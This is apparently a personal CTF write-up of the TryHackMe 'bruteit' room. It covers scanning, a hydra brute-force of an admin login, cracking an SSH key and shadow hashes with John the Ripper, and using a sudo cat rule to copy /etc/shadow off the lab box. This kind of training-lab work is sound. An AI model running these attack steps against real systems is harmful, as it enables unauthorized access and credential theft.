---
title: "THM:bruteit"
subtitle: "TryHackMe CTF room: https://tryhackme.com/room/bruteit"
category: "CTF"
tags: ctf,nmap,gobuster,hydra,apache,ubuntu,john,ssh2john,privesc
---
# THM:bruteit

URL: [https://tryhackme.com/room/bruteit](https://tryhackme.com/room/bruteit) [Easy]

Tags: 
<div style="margin-left: 5px;">
{% assign tags = page.tags | split: "," %}
{% for tag in tags %}
<a href="../search/?q={{tag}}" title="Click to search by this tag"><span class="badge bg-secondary">{{tag}}</span></a>
{% endfor %}
</div>
<hr>

## Reconnaissance

Description of the room: 

> Learn how to brute, hash cracking and escalate privileges in this box!

## Scanning

### Running: `nmap`

Ran the following:

> `nmap -sCV x.x.x.x`

Interesting ports found to be open:

```python
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b:0e:bf:14:fa:54:b3:5c:44:15:ed:b2:5d:a0:ac:8f (RSA)
|   256 d0:3a:81:55:13:5e:87:0c:e8:52:1e:cf:44:e0:3a:54 (ECDSA)
|_  256 da:ce:79:e0:45:eb:17:25:ef:62:ac:98:f0:cf:bb:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
```

Also see: [nmap.log](nmap.log)

### Running: `gobuster`

Ran the following:

> `gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://x.x.x.x`

Interesting folders found:

```python
/admin                (Status: 301) [Size: 314] [--> http://10.10.176.145/admin/]
/server-status        (Status: 403) [Size: 278]
/panel                (Status: 301) [Size: 320] [--> http://10.10.176.145/admin/panel/]
```

Also see: [gobuster.log](gobuster.log) and [gobuster-admin.log](gobuster-admin.log)

### Running: `nikto`

Ran the following:

> `nikto -h x.x.x.x`

Interesting info found:

```python
TBD                                   
```

Also see: [nikto.log](nikto.log)

### Running: `hydra`

When we see that `gobuster` found a `/admin/` URL, we View Source of the page and see that the username is `admin`. So, for giggles, lets send `hydra` trying the RockYou passwords for account `admin` on that login form:

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
    $TARGET http-post-form \
    "/admin/:user=^USER^&pass=^PASS^:F=invalid" -I 2>&1 | tee $ROOM/hydra.log
```

Sure enough, we find the password:

```bash
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-08-12 20:54:34
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://10.10.176.145:80/admin/:user=^USER^&pass=^PASS^:F=invalid
[80][http-post-form] host: 10.10.176.145   login: admin   password: ******
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-08-12 20:55:02
```

We can now log into the `/admin/` website portal where we have an `id_rsa` file, and also the web flag for the TryHackMe room. We also get a potential username `john`.

Also see: [hydra.log](hydra.log) and [id_rsa.txt](id_rsa.txt)

### John the Ripper

We have an `id_rsa` file that is password-protected. We need to get the file into a format that John the Ripper can use, so we run:

```bash
ssh2john ./id_rsa.txt > id_rsa.hash
```

Now we can run John the Ripper using the "RockYou" wordlist and see if we can crack this password:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt ./id_rsa.hash 
```

And sure enough, we find the password:

```bash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
**********       (./id_rsa.txt)     
1g 0:00:00:00 DONE (2023-08-12 21:07) 25.00g/s 1816Kp/s 1816Kc/s 1816KC/s saloni..rashon
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

We can now use that to try to SSH in, and we get in, but immediately get kicked out!

```bash
$ ssh admin@$TARGET -i ./id_rsa.txt                   

Enter passphrase for key './id_rsa.txt': 
Connection closed by 10.10.176.145 port 22
```

We try again with the username `john` from the main "Panel" page we found and we get in!

```bash
$ ssh john@$TARGET -i ./id_rsa.txt

Enter passphrase for key './id_rsa.txt': 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-118-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Aug 13 01:13:30 UTC 2023

  System load:  0.0                Processes:           109
  Usage of /:   25.8% of 19.56GB   Users logged in:     0
  Memory usage: 46%                IP address for eth0: 10.10.176.145
  Swap usage:   0%


63 packages can be updated.
0 updates are security updates.


Last login: Wed Sep 30 14:06:18 2020 from 192.168.1.106
john@bruteit:~$
```

## Gaining Access

We investigated various avenues but ultimately SSH'ing in as `john` with the `id_rsa` SSH key, and the password for that file discovered by John the Ripper was the way in.

### Unprivileged Access

Now that we're SSH'ed in as `john` we can see the `user.txt` flag needed for the TryHackMe room.

It we run a `sudo -l`, we can see we can run `cat` as `sudo`!

## Privilege Escalation

When we run a `sudo -l`, we see:

```bash
Matching Defaults entries for john on bruteit:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User john may run the following commands on bruteit:
    (root) NOPASSWD: /bin/cat
```

We can of course do something like:

```bash
sudo cat /root/root.txt
```

to get the root flag and finish the room, but we haven't actually rooted the box yet!

### Cracking the `/etc/passwd`

Since we will have access to see the contents of `/etc/passwd` and the `/etc/shadow`, then we might see if we can crack the passwords for the accounts on that box. First, on the target machine exfiltrate the contents of those files and put them in a common place:

#### Target Machine:
```bash
sudo cat /etc/passwd > /tmp/passwd
sudo cat /etc/shadow > /tmp/shadow
```

#### Your Workstation:
Then on your workstation, use SCP for example to go get those files from the target machine:

```bash
scp -i ./id_rsa.txt john@$TARGET:/tmp/passwd ./
scp -i ./id_rsa.txt john@$TARGET:/tmp/shadow ./
```

You can now merge `passwd` and `shadow` and make them one file, like it used to be in the olden days of Unix, with `unshadow`:

```bash
unshadow ./passwd ./shadow > ./combined.txt
```

Finally, let's have John the Ripper see if he can crack these passwords, and we'll use the RockYou wordlist again:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt ./combined.txt
```

And right away we get the `root` password:

```bash
Using default input encoding: UTF-8
Loaded 3 password hashes with 3 different salts (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
********         (root) 
1g 0:00:01:54 1.70% (ETA: 23:30:33) 0.008738g/s 2487p/s 4983c/s 4983C/s 1stson..141710
Use the "--show" option to display all of the cracked passwords reliably
Session aborted
```

I let it run for a few more minutes and it didn't find any others. With the `root` password we can just run `su` and type in the root password, and then we have a `root` prompt!

See also: [combined.txt](combined.txt), [passwd](passwd), and [shadow](shadow).

## Summary

Completed: [2023-08-12 21:44:16]